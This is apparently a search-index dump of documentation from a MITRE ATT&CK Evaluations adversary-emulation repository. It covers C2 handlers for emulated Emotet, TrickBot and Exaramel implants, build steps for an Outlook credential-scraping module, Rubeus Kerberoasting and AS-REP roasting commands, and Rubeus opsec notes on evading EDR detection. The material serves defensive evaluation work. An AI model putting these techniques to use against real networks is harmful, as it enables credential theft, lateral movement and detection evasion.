higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Start the control server:","Establish an implant session","Run the client"]}],[{"i":"attck-evaluations-emotet-handler","l":"ATT&CK Evaluations Emotet Handler","p":["The ATT&CK Evaluations Emotet Handler is used to handle communications between the Emotet Client and control server via a REST API.","The Emotet Handler provides features to communicate with the Emotet Client and forwarding control information to the Control Server.","The Emotet Handler must be run as root because it needs to bind to standard port 80. Optionally, you can start it with a different port and IP address by giving it command line params."]},{"l":"Build from source","p":["go build main.go"]},{"l":"Install dependencies","p":["Install Go version 1.15 or higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"l":"Run Tests"},{"l":"Go Build"},{"l":"Example usage","p":["View functions from emotet_test.go for an example on how to interact with the control server"]}],[{"i":"attck-evaluations-exaramel-for-linux-handler","l":"ATT&CK Evaluations Exaramel for Linux Handler","p":["The ATT&CK Evaluations Exaramel for Linux handler is used to handle communications between the ATT&CK Evaluations Exaramel for Linux client and the Control Server via a REST API.","This handler uses Task IDs to maintain state regarding the tasks that are sent to the client and the responses that are returned. It serves only HTTPS communications.","This handler must be run as root as it is intended to bind to port 443."]},{"l":"Usage","p":["This handler is automatically loaded by the control server when the control server is started."]},{"l":"Tasking Commands","p":["Task commands to the Exaramel for Linux client using evalsC2Client.py:","Note: The ATT&CK Evaluations version of Exaramel for Linux uses a static GUID of: exaramel-implant.","Commands that can be provided to the implant:"]},{"l":"Run Tests","p":["Install Go version 1.15 or higher.","Enter the control server directory, and run Exaramel for Linux tests. Go will automatically fetch dependencies."]},{"l":"Install Dependencies","p":["Dependencies will be automatically installed by Go when running the tests.","The go.mod file contains detailed information on the dependencies."]}],[{"i":"attck-evaluations-trickbot-handler","l":"ATT&CK Evaluations TrickBot Handler","p":["The ATT&CK Evaluations TrickBot Handler is used to handle communications between the Trickbot Client and control server via a REST API.","The TrickBot Handler provides features to communicate with the Trickbot Client and forwarding control information to the Control Server.","The Trickbot Handler must be run as root because it needs to bind to a standard port."]},{"l":"Build from source","p":["go build main.go"]},{"l":"Install dependencies","p":["Install Go version 1.15 or higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"l":"Run Tests"},{"l":"Go Build"},{"l":"Registration Example","p":["On server:","On client or another server shell:"]},{"l":"Get Task Example","p":["On client or another server shell:"]},{"l":"Post Task Output Example","p":["On client or another server shell:"]}],[{"l":"Emotet","p":["The Emotet client is broken up into the following components:","Component","Description","EmotetClientDLL","The main implant in DLL format","OutlookScraper","Outlook scraper module","LatMovementDLL","Lateral movement module"]},{"l":"Build Instructions"},{"l":"Build Implant","p":["Open the developer command prompt, navigate to directory containing the Emotet Client DLL Visual Studio solution file (EmotetClientDLL.sln), and run the devenv.exe command:","devenv.exe EmotetClientDLL.sln /build Release","Wait about 3 minutes for the build to finish.","The executable will be found in the Release folder:","Note: if building Emotet for the first time, first build EmotetClientDLL.sln in Visual Studio so it can fetch dependencies (googletest)."]},{"l":"Build OutlookScraper","p":["Open the command prompt (cmd.exe), navigate to directory containing the Outlook Scaper Visual Studio solution file (OutlookScraper.sln), and run the devenv.exe command:","\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" OutlookScraper.sln /build Release","The executable will be found in the Release folder."]},{"l":"Test Instructions","p":["Open the command prompt (cmd.exe), navigate to directory containing the Emotet Client DLL Visual Studio solution file (EmotetClientDLL.sln), and run the devenv.exe command:","\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" EmotetClientDLL.sln","Previous command will open project in Visual Studio, run all tests by opening the Test Explorer and clicking in on \"Run All Test In View\"."]},{"l":"Usage Examples"},{"i":"run-dll-client-via-rundll32exe","l":"Run DLL client via rundll32.exe","p":["Open the command prompt (cmd.exe)"]},{"l":"Cleanup Instructions","p":["Open a command prompt or PowerShell and navigate to the directory from where the DLL was ran.","del EmotetClientDLL.dll (or renamed) del Outlook.dll (if installed) del LatMovementDLL.dll (if installed) del PAExec.exe (if installed)"]},{"l":"Misc","p":["Conditions required:","Requires range configuration to remove Outlook prompt when DLL is accessing Outlook via PowerShell."]},{"l":"CTI Evidence","p":["https://attack.mitre.org/software/S0367 https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/ https://blogs.vmware.com/security/2019/04/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code.html https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/ https://unit42.paloaltonetworks.com/attack-chain-overview-emotet-in-december-2020-and-january-2021/ https://www.fortinet.com/blog/threat-research/deep-dive-into-emotet-malware https://support.malwarebytes.com/hc/en-us/articles/360038524714s"]},{"l":"References","p":["https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019"]}],[{"i":"emotets-lateral-movement","l":"Emotet's Lateral Movement","p":["Lateral movement module that enables users to execute commands, main use will be to give access to net.exe and paexec.exe. PAExec.exe is used to emulate Emotet's lateral movement via access of Remote Services: SMB/Windows Admin Shares."]},{"l":"Build Implant","p":["Open the command prompt (cmd.exe), navigate to directory containing the Lateral Movement Visual Studio solution file (LatMovementDLL.sln), and run the devenv.exe command:","\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" LatMovementDLL.sln /build Release","The dll will be found in the Release folder."]},{"l":"Test Instructions","p":["Open the command prompt (cmd.exe), navigate to directory containing the Lateral Movement Visual Studio solution file (LatMovementDLL.sln), and run the devenv.exe command:","\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" LatMovementDLL.sln","Previous command will open project in Visual Studio, run all tests by opening the Test Explorer and clicking in on \"Run All Test In View\"."]},{"l":"Usage Examples","p":["Exports command line function that receives string as parameter that will be executed."]},{"l":"Cleanup Instructions"},{"l":"CTI Evidence","p":["https://attack.mitre.org/software/S0367 https://support.malwarebytes.com/hc/en-us/articles/360038524714"]}],[{"i":"emotets-outlook-scraper","l":"Emotet's Outlook Scraper","p":["Microsoft Outlook Scraper that retrieves information from the victim's inbox."]},{"l":"Build Implant","p":["Open the command prompt (cmd.exe), navigate to directory containing the Outlook Scaper Visual Studio solution file (OutlookScraper.sln), and run the devenv.exe command:","\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" OutlookScraper.sln /build Release","The dll will be found in the Release folder."]},{"l":"Test Instructions","p":["Open the command prompt (cmd.exe), navigate to directory containing the Emotet Client DLL Visual Studio solution file (OutlookScraper.sln), and run the devenv.exe command:","\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" OutlookScraper.sln","Previous command will open project in Visual Studio, run all tests by opening the Test Explorer and clicking in on \"Run All Test In View\"."]},{"l":"Usage Examples","p":["Exports two functions. One function retrieves emails from the victim's inbox that may contain passwords. The other function retrieves a list of email addresses found in the inbox.","Both functions have the functionality to stop and restart the Outlook application. This will force the application to load with the same privilege as the calling implant."]},{"l":"Cleanup Instructions"},{"l":"Misc","p":["Requires range configuration to remove Outlook prompt when DLL is accessing Outlook via PowerShell.","For the changes to take effect, you must restart the Outlook Client"]},{"l":"CTI Evidence","p":["https://attack.mitre.org/software/S0367 https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/ https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/"]}],[{"l":"Rubeus","p":["\"Rubeus is a C# toolset for raw Kerberos interaction and abuses.\"","The goal for this evaluation is to steal the hash of the Domain Admin as a Domain User."]},{"l":"Build Instructions","p":["Open the command prompt (cmd.exe), navigate to directory containing the Rubeus Visual Studio solution file (Rubeus.sln), and run the devenv.exe command:","cd wizard_spider\\Resources\\Rubeus\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\devenv.exe\" Rubeus.sln /build Release"]},{"l":"alternate build command","p":["\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\msbuild.exe\" Rubeus.sln -property:Configuration=Release","The executable will be found in the bin\\Release folder."]},{"l":"Test Instructions","p":["Open PowerShell","cd wizard_spider\\Resources\\Rubeus rubeus_test.ps1"]},{"l":"Usage Examples"},{"l":"execute AS-Rep Roast","p":["rubeus.exe asreproast /domain:oz.local"]},{"l":"execute Kerberoast"},{"i":"must-be-executed-as-a-domain-user-ozuser-not-a-local-user-dorothyuser","l":"must be executed as a domain user (oz\\user) NOT a local user (dorothy\\user)"},{"i":"may-want-to-consider-adding-formathashcat-as-an-argument-default-format-is-john","l":"may want to consider adding /format:hashcat as an argument (default format is John)","p":["rubeus.exe kerberoast /domain:oz.local"]},{"l":"Cleanup Instructions","p":["Open a command prompt or PowerShell","del rubeus.exe"]},{"l":"Misc","p":["Conditions required to successfully compromise the Domain Admin password via Kerberoasting during the evaluation:","The Domain Admin must have a crackable password","The Domain Admin must have a Service Principal Name (SPN) associated with their account","Additionally, the CTI indicates the adversary also attempts AS-Rep Roasting. For this to work, Kerberos pre-authentication must be disabled (not done by default)."]},{"l":"CTI Evidence","p":["https://attack.mitre.org/groups/G0102/ https://thedfirreport.com/2020/10/08/ryuks-return/ https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/"]},{"l":"References","p":["https://github.com/GhostPack/Rubeus https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx https://blog.zsec.uk/path2da-pt2/ https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019"]}],[{"l":"Changelog","p":["All notable changes to this project will be documented in this file.","The format is based on Keep a Changelog, and this project adheres to Semantic Versioning."]},{"i":"163---2021-03-26","l":"[1.6.3] - 2021-03-26"},{"l":"Change","p":["Only final cert in chain used to verify when signing PKINIT requests, /verifycerts flag added for full verification"]},{"l":"Fixed","p":["Replaced /certificate info for help and README"]},{"i":"162---2021-03-12","l":"[1.6.2] - 2021-03-12"},{"l":"Added","p":["Adapted/integrated the PR from @RiccardoAncarani for /delay:MILLISECONDS and /jitter:%(1-100) flags for kerberoast","Rubeus.yar yara rule from FireEye's red team tool countermeasure repo"]},{"l":"Changed","p":["arguments can now use /arg=value form in addition to /arg:value"]},{"i":"fixed-1","l":"Fixed","p":["few kerberoasting fixes"]},{"i":"161---2020-12-09","l":"[1.6.1] - 2020-12-09"},{"i":"added-1","l":"Added","p":["/autoenterprise flag to automate retrying failed kerberoasting attempts (@0xe7)","support for CVE-2020-17049 using the /bronzebit switch (@0xe7)","initial support for basic silver tickets, without a PAC (@0xe7)"]},{"i":"fixed-2","l":"Fixed","p":["Cross domain enterprise principal kerberoasting (@0xe7)","Kerberoasting using DC IP and supplying a TGT (@0xe7)"]},{"i":"160---2020-11-06","l":"[1.6.0] - 2020-11-06"},{"i":"added-2","l":"Added","p":["/opsec switch to make asktgt/ asktgs/ s4u build requests more realistic (@0xe7)","/password support","/runfor:X flag for the monitor command (@G0ldenGunSec)","Added enc-authorization-data to TGS-REQs (@0xe7)","Added PA-DATA PA-PAC-OPTIONS to normal TGS-REQ when using /opsec(@0xe7)","Added proper checksums (@0xe7)","Automation of requesting forwarded TGT when requesting a service ticket for unconstrained systems (@0xe7)","Cross-domain s4u/ asktgs support (@0xe7)","Don't send AS-REQ when preauth is disabled (@0xe7)","IPv6support (@royreinders)","OPSEC","Randomized sequence numbers (@0xe7)","Start of smartcard/PKINIT support (@CCob)","Support for /spns option when kerberoasting (@0xe7)","Support for modifying S4U2Self tickets to be able to impersonate any user on the requesting machine (@0xe7)","Support for NT-Enterprise principals for service ticket requests on both the asktgs and kerberoast commands (@0xe7)"]},{"i":"changed-1","l":"Changed","p":["kerberoast /user:X now takes multiple comma separated values"]},{"i":"fixed-3","l":"Fixed","p":["Casing fix for AES key salts","Kerberoasting when using TGT to authenticate but not supplying SPNs (@0xe7)","GetDCName() issue on non-domain-joined systems","Nonced randomized","Fixes for issues from non domain machines (@VbScrub)","Replaced checks for \"NT Authority\\System\" string with SID comparison","/rc4opsec service name fix","LDAP paged searching (@cnotin)","TGS-REQ AES formatting (@Ion Todd)"]},{"i":"150---2020-01-31","l":"[1.5.0] - 2020-01-31"},{"i":"added-3","l":"Added","p":["/ldapfilter argument for adding custom LDAP filters to the user search query","/pwdsetafter, /pwdsetbefore, and /resultlimit arguments for better targeting (from @pkb1s)","/simple argument for output file formatting but to the console","/stats flag to list statistics of user accounts without actually roasting them","brute action (from @Zer1t0)","currentluid command to display the current logon sesion ID","More flexible targeting with /user//LUID//service//server/","option to save .kirbi file to disk (from @audrummer15)","Performs password bruteforcing attacks using raw AS-REQs","the /consoleoutfile argument to redirect console output to a file, and the public MainString(command) function to work over PSRemoting (see end of README.md)","the cross-domain s4u support (from @0xe7)","the universal /nowrap argument prevents base64 ticket blobs from being display-wrapped","to any command that outputs base64 ticket blobs","to the asktgt/ asktgs/ s4u actions","to the asreproast action","to the kerberoast action","to the s4u action","to triage/ klist/ dump actions"]},{"i":"changed-2","l":"Changed","p":["LSA.cs got a complete overhaul for reusability and flexibility (thanks for the help @leechristensen !)","kerberoast action updated to exclude disabled accounts by default","harvest mode's /interval argument is now in seconds, to match /monitor","harvest/ /monitor modes revamped","now no longer depend on searching the event logs for 4624 events","full set of current TGTs are extracted each monitor round"]},{"i":"fixed-4","l":"Fixed","p":["Some timestamp converting code in the ticket extraction section","KERB_RETRIEVE_TKT_REQUEST fix for x32 systems (from @0xRCA)","Fixed AES salt generation (from @monoxgas)","Fixed accidental ticket request behavior when dumping from LsaCallAuthenticationPackage","Fixed renew command invocation","Fixed asreproast LDAP querying (broke at some point)"]},{"i":"142---2019-03-01","l":"[1.4.2] - 2019-03-01"},{"i":"added-4","l":"Added","p":["tgssub action","Substitutes in alternate sname (cifs) or SPN (ldap/computer.domain.com) into an existing service ticket"]},{"i":"141---2019-02-25","l":"[1.4.1] - 2019-02-25"},{"i":"added-5","l":"Added","p":["to asktgs action","/enctype:[RC4/AES128/AES256/DES] now forces that particular encryption type in the TGS-REQ"]},{"i":"changed-3","l":"Changed","p":["asktgt action","Returned tickets now run through the describe command","describe action","Kerberoast hash now only extracted from RC4_HMAC tickets"]},{"i":"140---2019-02-16","l":"[1.4.0] - 2019-02-16"},{"i":"added-6","l":"Added","p":["hash action","hashes a given password to rc4_hmac form, and if /user and /domain supplied, calculates aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 forms"]},{"i":"changed-4","l":"Changed","p":["kerberoast action","Fixed query that checks that rc4_hmac is flipped in msds-supportedencryption types, because \"lol Microsoft\"","asktgt action","/aes128 and /aes now supported for /enctype when used with /password","crypto","Replaced @qlemaire's PR of Kevin-Robertson' Get-KerberosAESKey hash code with @gentilkiwi's KERB_ECRYPT HashPassword approach","README","added @elad_shamir into the references"]},{"i":"136---2019-02-14","l":"[1.3.6] - 2019-02-14"},{"i":"added-7","l":"Added","p":["kerberoast action","/rc4opsec option to use tgtdeleg and filter out AES-enabled accounts","/aes option to AES roast only AES-enabled accounts"]},{"i":"changed-5","l":"Changed","p":["kerberoast action","Default user query searches for accounts with RC4 enabled","Default behavior when using the /tgtdeleg flag requests RC4 for ALL accounts (including AES)","Display \"Supported ETypes\" in enumerated output","tgtdeleg action","Changed the default requested SPN from HOST/dc.domain.com to cifs/dc.domain.com"]},{"i":"fixed-5","l":"Fixed","p":["Kerberoast hash display for some option combinations"]},{"i":"135---2019-02-13","l":"[1.3.5] - 2019-02-13"},{"i":"changed-6","l":"Changed","p":["kerberoast action","now has /ticket option to use an existing TGT for Kerberoasting","now has /usetgtdeleg option to use tgtdeleg option as the TGT for Kerberoasting","LDAP user search path and number of found users now output","describe action","Kerberoast hash output now generated for service tickets"]},{"i":"fixed-6","l":"Fixed","p":["Kerberoast hash display but when /spn and /outfile were specified","Kerberoast samaccountname now properly put into hash output"]},{"i":"134---2019-02-12","l":"[1.3.4] - 2019-02-12"},{"i":"changed-7","l":"Changed","p":["kerberoast action now has /domain and /dc like asreproast action","kerberoast and asreproast now properly work over domain trusts","triage command now works for the current non-elevated user, outputting current LUID as well","Current LUID output also added for non-elevated dump and klist commands","Added Opsec section in README.md"]},{"i":"133---2019-02-11","l":"[1.3.3] - 2019-02-11"},{"i":"changed-8","l":"Changed","p":["Landed @leechristensen's cleanup of the Monitor4624 code","Restructed the README.md to match the help output, updated all examples, added table of contents"]},{"i":"133---2019-02-07","l":"[1.3.3] - 2019-02-07"},{"i":"added-8","l":"Added","p":["triage action","Quickly triages the users and present tickets on a machine"]},{"i":"changed-9","l":"Changed","p":["dump and klist changed default LUID output to hex format"]},{"i":"132---2019-02-06","l":"[1.3.2] - 2019-02-06"},{"i":"added-9","l":"Added","p":["kerberoast and asreproast actions","Added /outfile:X to output hashes to a file, one hash per line"]},{"i":"changed-10","l":"Changed","p":["asreproast changed asreproast's default behavior to match kerberoast","Clustered the default output help menu around function (things were getting crowded)"]},{"i":"131---2019-02-06","l":"[1.3.1] - 2019-02-06"},{"i":"fixed-7","l":"Fixed","p":["Changed underlying LUID logic to handle UInt64s"]},{"i":"130---2019-02-05","l":"[1.3.0] - 2019-02-05"},{"i":"added-10","l":"Added","p":["klist action","lists current user's (or if elevated, all users') ticket information"]},{"i":"changed-11","l":"Changed","p":["s4u landed @eladshamir's pull requests","RBCD support","support loading TGS from Kirbi to skip S4U2Self and perform S4U2Proxy only","perform S4U2Self only","print output for each stage","asreproast landed @rvrsh3ll's pull request","added hashcat output format","asktgt landed @qlemaire's pull request","now accepts a /password:X parameter","monitor and harvest landed @djhohnstein's pull request","ticket extraction can now be saved to the registry with the \"/registry:X\" flag"]},{"i":"fixed-8","l":"Fixed","p":["dump display of service tickets with multiple slashes","response buffer size in lib/Networking.cs increased for large ticket responses","landed @BlueSkeye's fixes for PTT bug fix, TicketFlags display, and dead code removal in PA_DATA.Encode"]},{"i":"121---2018-10-09","l":"[1.2.1] - 2018-10-09"},{"i":"changed-12","l":"Changed","p":["Merged @mark-s' PR that broke out Program.cs' commands into 'Command' classes for easier command addition.","Commands that pass /dc:X are now passed through Networking.GetDCIP(), which resolves the DC name (if null) and returns the DC IP. Code refactored to use this centralized resolver.","The /user:USER flag can now be /user:DOMAIN.COM\\USER (auto-completes /domain:Y).","The harvest command now returns the user ticket with the latest renew_till time on intial extraction."]},{"i":"120---2018-10-03","l":"[1.2.0] - 2018-10-03"},{"i":"added-11","l":"Added","p":["changepw action","implements the AoratoPw user password reset from a TGT .kirbi","equivalent to Kekeo's misc::changepw function"]},{"i":"110---2018-09-31","l":"[1.1.0] - 2018-09-31"},{"i":"added-12","l":"Added","p":["asktgs action - takes /ptt:X, /dc:X, /ticket:X flags like asktgt, /service:X takes one or more SPN specifications","tgtdeleg action - reimplements @gentilkiwi's Kekeo tgt::deleg function","uses the GSS-API Kerberos specification (RFC 4121) to request a \"fake\" delegation context that stores a KRB-CRED in the Authenticator Checksum. Combined with extracting the service session key from the local cache, this allows us to recover usable TGTs for the current user without elevation.","Added CHANGELOG.md"]},{"i":"changed-13","l":"Changed","p":["s4u action now accepts multiple alternate snames (/altservice:X,Y,...)","This executes the S4U2self/S4U2proxy process only once, and substitutes the multiple alternate service names into the final resulting service ticket structure(s) for as many snames as specified","asreproast action","added eventual hashcat output format, use \"/format:<john/hashcat>\" (default of \"john\")"]},{"i":"fixed-9","l":"Fixed","p":["dump action now correctly extracts ServiceName/TargetName strings","asreproast action - fixed salt demarcation line for \"asreproast\" hashes","kerberoast action","Added reference for @machsosec for the KerberosRequestorSecurityToken.GetRequest Kerberoasting Method()","Corrected encType extraction for the hash output"]},{"i":"100---2018-08-24","l":"[1.0.0] - 2018-08-24","p":["Initial release"]}],[{"l":"Rubeus","p":["Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy's Kekeo project (CC BY-NC-SA 4.0 license) and Vincent LE TOUX's MakeMeEnterpriseAdmin project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.","Charlie Clark and Ceri Coburn have both made significant contributions to the Rubeus codebase. Elad Shamir contributed some essential work for resource-based constrained delegation. Their work is very appreciated!","Rubeus also uses a C# ASN.1 parsing/encoding library from Thomas Pornin named DDer that was released with an \"MIT-like\" license. Huge thanks to Thomas for his clean and stable code!","PKINIT code heavily adapted from @SteveSyfuhs's Bruce tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!","The KerberosRequestorSecurityToken.GetRequest method for Kerberoasting was contributed to PowerView (and then incorporated into Rubeus) by @machosec.","@harmj0y is the primary author of this code base.","Rubeus is licensed under the BSD 3-Clause license."]},{"l":"Table of Contents","p":["asktgs","asktgt","asreproast","Background","brute","changepw","Command Line Usage","Compile Instructions","Constrained delegation abuse","createnetonly","currentluid","describe","dump","Example: Credential Extraction","Example: Over-pass-the-hash","Examples","harvest","hash","kerberoast","kerberoasting opsec","klist","Miscellaneous","monitor","Opsec Notes","Overview","ptt","purge","renew","Roasting","Rubeus","s4u","Sidenote Sidenote: Running Rubeus Over PSRemoting","Sidenote: Building Rubeus as a Library","Sidenote: Running Rubeus Through PowerShell","Targeting other .NET versions","tgssub","tgtdeleg","Ticket Extraction and Harvesting","Ticket Management","Ticket requests and renewals","triage","Weaponization"]},{"l":"Background"},{"l":"Command Line Usage"},{"l":"Opsec Notes","p":["This section covers some notes on the operational security of using Rubeus in an environment, with some technical examples comparing/contrasting some of its approaches to Mimikatz. The material here will be expanded in the future."]},{"l":"Overview","p":["Any action you perform on a system is a detectable risk, especially when abusing functionality in \"weird\"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating \"everything is stealthy until someone is looking for it\"- tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in Matt Graeber and Lee Christensenâs Black Hat USA 2018 âSubverting Sysmonâ talk and associated whitepaper.","From the host perspective, Rubeus can be caught during initial weaponization of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4_hmac use in tickets in a modern environment).","From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256_cts_hmac_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as \"encryption downgrade\"."]},{"l":"Weaponization","p":["One common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run through PowerShell(this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we do not release compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a library then it's susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike's execute_assembly) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.","Also, AMSI (the Antimalware Scan Interface) has been added to .NET 4.8. Ryan Cobb has additional details on the offensive implications of this in the Defense section of his âEntering a Covenant: .NET Command and Controlâ post."]},{"i":"example-credential-extraction","l":"Example: Credential Extraction","p":["Say we have elevated access on a machine and want to extract user credentials for reuse.","Mimikatz is the swiss army knife of credential extraction, with multiple options. The sekurlsa::logonpasswords command will open up a read handle to LSASS, enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. Sidenote: the sekurlsa::ekeys command will enumerate ALL key types present for the Kerberos package.","Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the tgtdeleg command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a GetSystem equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.","Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:","Mimikatz can also carve tickets directly out of LSASS' memory with:","As \"everything is stealthy until someone is looking for it\", it's arguable whether LSASS manipulation or ticket extraction via the LsaCallAuthenticationPackage() API call is more \"stealthy\". Due to Mimikatz' popularity, opening up a handle to LSASS and reading/writing its memory has become a big target for EDR detection and/or prevention. However, LsaCallAuthenticationPackage() is used by a fairly limited set of processes, and creating a fake logon application with LsaRegisterLogonProcess() is also fairly anomalous behavior. However full API level introspection and baselining appears to be a more difficult technical problem than LSASS protection."]},{"i":"example-over-pass-the-hash","l":"Example: Over-pass-the-hash","p":["Say we recover a user's rc4_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access.","Sidenote: pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by Benjamin Delpy and Skip Duckwall(see their \"Abusing Microsoft Kerberos - Sorry you guys don't get it\" presentation for more information). This approach turns a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).","Let's compare \"over-passing-the-hash\" via Mimikatz' sekurlsa::pth command verus using the asktgt command from Rubeus (or Kekeo if you'd like).","When sekurlsa::pth is used to over-pass-the-hash, Mimikatz first creates a new logon type 9 process with dummy credentials - this creates a new \"sacrificial\" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then patched into the appropriate section for the associated logon session (in this case, the \"sacrificial\" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.","When Rubeus' asktgt command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the /ptt flag is passed.","With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with /ptt), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the /createnetonly command to create a sacrificial process/logon session, then using /ptt /ticket:X /luid:0xa.. with the newly created process LUID. If using Cobalt Strike, using the make_token command with dummy credentials and then kerberos_ticket_use with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.","It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.","Sidenote: one way both approaches can potentially be caught is the previously mentioned \"encryption downgrade\" detection. To retrieve AES keys, use Mimikatz' sekurlsa::ekeys module to return ALL Kerberos encryption keys (same with lsadump::dcsync) which are better to use when trying to evade some detections."]},{"l":"Ticket requests and renewals","p":["Breakdown of the ticket request commands:","Command","Description","asktgt","Request a ticket-granting-ticket (TGT) from a hash/key or password","asktgs","Request a service ticket from a passed TGT","renew","Renew (or autorenew) a TGT or service ticket","brute","Perform a Kerberos-based password bruteforcing attack"]},{"l":"asktgt","p":["The asktgt action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (/rc4, /aes128, /aes256, or /des). A /password flag can also be used instead of a hash - in this case /enctype:X will default to RC4 for the exchange, with des|aes128|aes256 as options. If no /domain is specified, the computer's current domain is extracted, and if no /dc is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The /ptt flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session. The /luid:0xA.. flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.","Note that no elevated privileges are needed on the host to request TGTs or apply them to the current logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the /ptt option. A workaround is to use the /createnetonly:C:\\X.exe parameter (which hides the process by default unless the /show flag is specified), or request the ticket and apply it to another logon session with ptt /luid:0xA...","By default, several differences exists between AS-REQ's generated by Rubeus and genuine AS-REQ's. To form AS-REQ's more inline with genuine requests, the /opsec flag can be used, this will send an initial AS-REQ without pre-authentication first, if this succeeds, the resulting AS-REP is decrypted and TGT return, otherwise an AS-REQ with pre-authentication is then sent. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than aes256 and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used 